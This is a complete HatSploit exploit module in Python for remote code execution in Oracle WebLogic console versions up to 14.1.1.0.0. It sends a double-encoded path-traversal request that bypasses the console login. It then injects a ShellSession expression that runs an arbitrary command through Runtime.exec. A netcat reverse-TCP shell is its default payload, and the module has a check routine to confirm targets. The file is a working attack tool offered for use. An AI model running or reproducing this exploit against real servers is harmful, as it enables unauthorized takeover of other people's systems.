"""
This module requires HatSploit: https://hatsploit.com
Current source: https://github.com/EntySec/HatSploit
"""

from hatsploit.lib.handler import Handler
from hatsploit.lib.module import Module
from pex.proto.http import HTTPClient


class HatSploitModule(Module, Handler, HTTPClient):
    def __init__(self):
        super().__init__()

        self.details = {
            'Category': "exploit",
            'Name': "Oracle Weblogic console RCE",
            'Module': "exploit/linux/oracle/weblogic_console_rce",
            'Authors': [
                'Ivan Nikolsky (enty8080) - module developer',
            ],
            'Description': "Remote Code Execution in Oracle Weblogic <= 14.1.1.0.0.",
            'Platform': "linux",
            'Rank': "high",
        }

        self.payload = {
            'Value': "unix/generic/netcat_reverse_tcp",
            'Architectures': None,
            'Platforms': ['linux', 'unix'],
            'Types': None,
        }

        self.options = {
            'HOST': {
                'Description': "Remote host.",
                'Value': None,
                'Type': "ip",
                'Required': True,
            },
            'PORT': {
                'Description': "Remote port.",
                'Value': None,
                'Type': "port",
                'Required': True,
            },
        }

    def exploit(self, remote_host, remote_port, command):
        self.http_request(
            method="POST",
            host=remote_host,
            port=remote_port,
            path='/console/images/%252E%252E%252Fconsole.portal',
            data=(
                f"_nfpb=false&_pageLabel=&handle=com.tangosol.coherence.mvel2.sh.ShellSession(\"java.lang.Runtime.getRuntime().exec('{command}');\");"
            ),
        )

    def check(self):
        remote_host, remote_port = self.parse_options(self.options)

        response = self.http_request(
            method="GET",
            host=remote_host,
            port=remote_port,
            path='/console/images/%252E%252E%252Fconsole.portal',
        )

        return bool(response and response.status_code == 200)

    def run(self):
        remote_host, remote_port = self.parse_options(self.options)

        self.module_handle(self,
                           host=remote_host,
                           sender=self.exploit,
                           args={'remote_host': remote_host, 'remote_port': remote_port},
                           )
